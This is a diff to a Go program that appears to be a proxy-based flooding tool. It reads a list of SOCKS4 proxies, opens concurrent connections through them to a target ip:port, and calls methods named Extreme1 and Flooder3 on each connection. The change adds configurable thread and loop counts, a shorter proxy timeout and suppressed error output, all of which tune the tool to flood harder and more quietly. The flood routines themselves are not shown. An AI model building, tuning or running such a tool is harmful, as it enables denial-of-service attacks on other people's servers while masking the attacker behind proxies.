@@ -7,25 +7,36 @@ import (
 	"log"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 
 	"h12.io/socks"
 )
 
-func checkArguments(cleanArgs []string) string {
-	if len(cleanArgs) == 0 {
-		fmt.Println("Arguments: ip:port")
+func checkArguments(cleanArgs []string) (string, int, int) {
+	argsMessage := "Arguments: <ip:port> <threads> <loop>"
+
+	if len(cleanArgs) < 3 {
+		fmt.Println(argsMessage)
 		os.Exit(1) // is it a good way to do that....
 	}
 
 	var serverAddress = cleanArgs[0]
 
 	if !strings.Contains(serverAddress, ":") {
-		fmt.Println("Arguments: ip:port")
+		fmt.Println(argsMessage)
 		os.Exit(1)
 	}
 
-	return serverAddress
+	threads, err := strconv.Atoi(cleanArgs[1])
+	loop, errn := strconv.Atoi(cleanArgs[2])
+
+	if err != nil || errn != nil {
+		fmt.Println(argsMessage)
+		os.Exit(1)
+	}
+
+	return serverAddress, threads, loop
 }
 
 func parseProxies() []string {
@@ -50,7 +61,7 @@ func parseProxies() []string {
 }
 
 func makeConnection(proxyAddress string, serverAddress string) (net.Conn, error) {
-	address := fmt.Sprintf("socks4://%s?timeout=4s", proxyAddress)
+	address := fmt.Sprintf("socks4://%s?timeout=2s", proxyAddress)
 
 	dialSocks := socks.Dial(address)
 	conn, err := dialSocks("tcp", serverAddress)
@@ -59,13 +70,13 @@ func makeConnection(proxyAddress string, serverAddress string) (net.Conn, error)
 }
 
 func main() {
-	var serverAddress = checkArguments(os.Args[1:])
+	var serverAddress, threads, loop = checkArguments(os.Args[1:])
 
 	proxies := parseProxies()
-	data := methods.MethodData{Address: serverAddress, Loop: 2}
+	data := methods.MethodData{Address: serverAddress, Loop: loop}
 
 	// Guard is needed to limit goroutines
-	guard := make(chan struct{}, 10)
+	guard := make(chan struct{}, threads)
 
 	for _, proxy := range proxies {
 		guard <- struct{}{}
@@ -73,10 +84,10 @@ func main() {
 			var conn, err = makeConnection(proxy, serverAddress)
 
 			if err != nil {
-				fmt.Println(err)
+				//fmt.Println(err)
 				// remove proxy from file (maybe) and slice
 			} else {
-				methods.Extreme1(data, conn)
+				methods.Flooder3(data, conn)
 			}
 
 			<-guard
